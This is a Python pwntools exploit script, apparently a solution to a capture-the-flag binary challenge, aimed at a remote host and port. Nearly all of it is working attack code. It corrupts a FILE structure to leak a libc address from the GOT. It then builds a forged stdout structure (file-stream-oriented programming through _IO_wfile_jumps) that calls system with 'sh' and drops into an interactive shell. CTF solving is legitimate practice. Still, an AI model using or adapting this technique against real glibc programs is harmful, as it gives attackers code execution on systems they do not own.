#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *fread
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=-0x20):
    fs = FileStructure()   
    fs.flags = u64(b' sh\0\0\0\0\0') #the space is important!
    fs._lock = elf.bss(0x200)
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset   
    return bytes(fs)

def exploit():
    #Other solve https://github.com/fyrepaw13/ctf_writeups/blob/main/WGMY2024/README.md#pwnscreenwriter
    #Erge script solve
    global io
    io = initialize()

    # Read GOTS
    fp = FileStructure()
    fp.write(elf.got.puts, 8)
    fp._IO_read_ptr = elf.got.puts
    fp._IO_read_end = elf.got.puts+16
    io.sendlineafter(b"Choice: ", "1")
    io.sendlineafter(b"What's your name: ", b"\x00"*0x28 + p64(0x1e1) + bytes(fp)[:96])

    #fread
    io.sendlineafter(b"Choice: ", "3")
    io.recvline()
    puts = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]

    #fread stdout
    fp = FileStructure()
    fp.read(libc.sym["_IO_2_1_stdout_"], 0x300)

    io.sendlineafter(b"Choice: ", "1")
    io.sendafter(b"What's your name: ", b"\x00"*0x28 + p64(0x1e1) + bytes(fp)[:115])

    io.sendlineafter(b"Choice: ", "3")
    io.send(fsrop(libc.sym._IO_2_1_stdout_))
    log.info("Puts: %#x", puts)
    log.info("Libc base: %#x", libc.address)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
